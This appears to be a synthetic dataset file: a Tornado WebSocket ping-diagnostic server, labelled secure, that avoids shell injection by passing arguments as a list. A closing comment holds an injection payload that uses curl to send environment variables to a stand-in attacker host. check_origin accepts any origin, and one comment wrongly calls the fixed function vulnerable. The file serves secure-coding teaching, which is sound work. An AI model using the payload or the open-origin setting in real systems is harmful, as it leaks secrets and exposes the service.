import os
import json
import sqlite3
import logging
import subprocess
import tornado.ioloop
import tornado.web
import tornado.websocket
from datetime import datetime

# Configure logging for the Real-Time Network Diagnostic Node
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - NetDiagSocket - %(levelname)s - %(message)s'
)
logger = logging.getLogger("TornadoWebSocket")

DB_FILE = "websocket_diagnostics.db"
WS_PORT = 8888

def init_diagnostic_db():
    """Initializes the SQLite database to track diagnostic requests over WebSockets."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE ws_audit_log (
            request_id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            client_ip TEXT NOT NULL,
            target_host TEXT NOT NULL,
            diagnostic_type TEXT NOT NULL,
            status TEXT NOT NULL,
            execution_time REAL
        )
    ''')
    
    # Pre-populate with historical mock records for the dataset
    mock_history = [
        ('192.168.1.50', '8.8.8.8', 'ping', 'SUCCESS', 2.1),
        ('192.168.1.51', 'invalid-host.local', 'traceroute', 'FAILED', 0.5)
    ]
    cursor.executemany('''
        INSERT INTO ws_audit_log (client_ip, target_host, diagnostic_type, status, execution_time)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("WebSocket diagnostic audit database initialized.")

def log_diagnostic_request(client_ip: str, target: str, diag_type: str, status: str, duration: float):
    """Records the outcome of a WebSocket diagnostic task."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO ws_audit_log (client_ip, target_host, diagnostic_type, status, execution_time) VALUES (?, ?, ?, ?, ?)",
            (client_ip, target, diag_type, status, duration)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log WebSocket request from {client_ip}: {e}")

def execute_network_ping(target_host: str, ping_count: str, client_ip: str) -> str:
    """
    SECURE: Uses a command list and shell=False to prevent Command Injection.
    """
    logger.info(f"Initiating secure ping diagnostic for {target_host} requested by {client_ip}")
    
    start_time = datetime.now()
    
    # Secure: Commands are defined as lists of arguments. This removes shell chaining
    # and ensures the untrusted target_host and ping_count fields are passed safely
    # as direct arguments to the ping executable.
    command_args = [
        "ping",
        "-c", str(ping_count),
        str(target_host)
    ]
    
    try:
        logger.debug(f"Executing secure system diagnostic command: {command_args}")
        
        process = subprocess.Popen(
            command_args,
            shell=False,  # Explicitly disabled for security
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate(timeout=15)
        duration = (datetime.now() - start_time).total_seconds()
        
        if process.returncode == 0:
            logger.info(f"Ping diagnostic completed successfully for {target_host}.")
            log_diagnostic_request(client_ip, target_host, "ping", "SUCCESS", duration)
            return stdout
        else:
            logger.error(f"Ping diagnostic failed for {target_host}. Exit code: {process.returncode}")
            # Masking raw stderr back to the WebSocket to prevent leaking system 
            # information or injected command output to the client.
            log_diagnostic_request(client_ip, target_host, "ping", "FAILED", duration)
            return "Diagnostic Error: Ping failed to reach the target host."
            
    except subprocess.TimeoutExpired:
        duration = (datetime.now() - start_time).total_seconds()
        logger.error(f"Diagnostic timed out for {target_host}.")
        log_diagnostic_request(client_ip, target_host, "ping", "TIMEOUT", duration)
        return "Error: Diagnostic process timed out."
    except FileNotFoundError as e:
        logger.error(f"Ping binary not found: {e}")
        log_diagnostic_request(client_ip, target_host, "ping", "ERROR", 0.0)
        return "Error: Ping utility missing from the system."
    except Exception as e:
        logger.error(f"System error during diagnostic of {target_host}: {e}")
        log_diagnostic_request(client_ip, target_host, "ping", "ERROR", 0.0)
        return "Internal Error: System error during diagnostic execution."

class DiagnosticWebSocketHandler(tornado.websocket.WebSocketHandler):
    """Handles persistent WebSocket connections for real-time network diagnostics."""
    
    def check_origin(self, origin):
        # Allow connections from any origin for the sake of this dataset example
        return True

    def open(self):
        client_ip = self.request.remote_ip
        logger.info(f"New WebSocket connection established from {client_ip}")
        self.write_message(json.dumps({"status": "connected", "message": "Diagnostic console ready."}))

    def on_message(self, message):
        client_ip = self.request.remote_ip
        logger.info(f"Received JSON message from {client_ip}: {message}")
        
        try:
            data = json.loads(message)
            action = data.get("action")
            
            if action == "ping":
                target = data.get("target_host", "127.0.0.1")
                # Defaulting to 4 pings if not specified
                count = str(data.get("ping_count", "4"))
                
                # Pass the untrusted fields from the WebSocket message to the vulnerable function
                result = execute_network_ping(target, count, client_ip)
                
                self.write_message(json.dumps({
                    "action": "ping_result",
                    "target_host": target,
                    "output": result
                }))
            else:
                self.write_message(json.dumps({"error": "Unsupported action requested."}))
                
        except json.JSONDecodeError:
            logger.warning(f"Malformed JSON received from {client_ip}")
            self.write_message(json.dumps({"error": "Invalid JSON format."}))

    def on_close(self):
        client_ip = self.request.remote_ip
        logger.info(f"WebSocket connection closed by {client_ip}")

def make_app():
    """Configures the Tornado Web application routing."""
    return tornado.web.Application([
        (r"/ws/diagnostics", DiagnosticWebSocketHandler),
    ])

if __name__ == "__main__":
    init_diagnostic_db()
    app = make_app()
    app.listen(WS_PORT)
    
    logger.info(f"Tornado WebSocket Diagnostics Server listening on ws://0.0.0.0:{WS_PORT}/ws/diagnostics")
    
    # Example Malicious WebSocket Client Payload (e.g., sent via browser console or wscat):
    # {
    #   "action": "ping",
    #   "target_host": "127.0.0.1",
    #   "ping_count": "1; curl http://attacker.com/data -d \"$(env)\"; #"
    # }
    
    try:
        tornado.ioloop.IOLoop.current().start()
    except KeyboardInterrupt:
        logger.info("Shutting down Tornado WebSocket Server.")
        tornado.ioloop.IOLoop.current().stop()
